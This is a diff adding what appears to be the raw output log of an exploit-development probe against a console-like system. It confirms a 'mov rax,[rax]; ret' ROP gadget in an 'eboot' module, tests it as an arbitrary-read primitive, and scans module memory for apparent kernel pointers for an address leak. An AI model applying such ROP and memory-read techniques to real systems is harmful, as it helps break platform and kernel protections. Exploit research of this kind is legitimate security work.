@@ -1,0 +1,45 @@
+=== PROBE 119a: RAX ARBITRARY READ ===
+
+pid=1426
+eboot=0x07CFD4000
+
+--- A: VERIFY GADGET BYTES ---
+  eboot+0x1EEBB dword: 0xC3008B48 (expect 0xC3008B48)
+  *** GADGET BYTES CONFIRMED: mov rax,[rax]; ret ***
+
+--- B: TEST WITH KNOWN VALUES ---
+  memory.rq(eboot): 0x6365786562696C2F
+  gadget(eboot):    0x6365786562696C00
+  memory.rq(tbuf):  0xCAFEBABE12345678
+  gadget(tbuf):     0xCAFEBABE12345600
+  memory.rq(tbuf+8):0xDEADBEEF87654321
+  gadget(tbuf+8):   0xDEADBEEF87654400
+  match: eboot=false tbuf=false tbuf+8=false
+
+--- C: SCAN ALL MODULE DATA SEGMENTS ---
+  mod 0 text=0x07CFD4000
+    *** KPTR mod0 +0x2002C0: 0xFFFFFF08BD8B4853 ***
+    *** KPTR mod0 +0x200390: 0xFFFFFB589D8948F6 ***
+    *** KPTR mod0 +0x200408: 0xFFFFFB58BD8B48FF ***
+    *** KPTR mod0 +0x200588: 0xFFFFFB58BD8B48FF ***
+    *** KPTR mod0 +0x2009F8: 0xFFFFFEE0958D48A0 ***
+    *** KPTR mod0 +0x200BE0: 0xFFFFFCB88511F8C5 ***
+    *** KPTR mod0 +0x200C60: 0xFFFFFEE0BD8D4800 ***
+    *** KPTR mod0 +0x200C78: 0xFFFFFEE0B58D48FF ***
+    *** KPTR mod0 +0x200DD0: 0xFFFFFBD8B58D48FF ***
+    *** KPTR mod0 +0x200E08: 0xFFFFFBE0BD8B48FF ***
+    *** KPTR mod0 +0x200ED0: 0xFFFFFD589D8D48FF ***
+    *** KPTR mod0 +0x200F08: 0xFFFFFC28BD8D4800 ***
+    *** KPTR mod0 +0x200F20: 0xFFFFFC28958D4806 ***
+    *** KPTR mod0 +0x200F60: 0xFFFFFC2885C748D0 ***
+    *** KPTR mod0 +0x2010C8: 0xFFFFFBC0BD8D48FF ***
+    *** KPTR mod0 +0x201150: 0xFFFFFEF88511F8C5 ***
+    *** KPTR mod0 +0x201220: 0xFFFFFB58BD8B48FF ***
+    *** KPTR mod0 +0x201270: 0xFFFFFD00958D48FF ***
+    *** KPTR mod0 +0x2012C0: 0xFFFFFD408D8948FF ***
+    *** KPTR mod0 +0x201368: 0xFFFFFC68BD8B4800 ***
+  total module data kptrs: 20
+
+--- D: SCAN PIPE/ROPCHAIN INTERNALS ---
+  fn_addr=0x31090dfd0 rop=0x31090e0f0 addr=0x807280b57
+  fn_addr vicinity: 0 kptrs
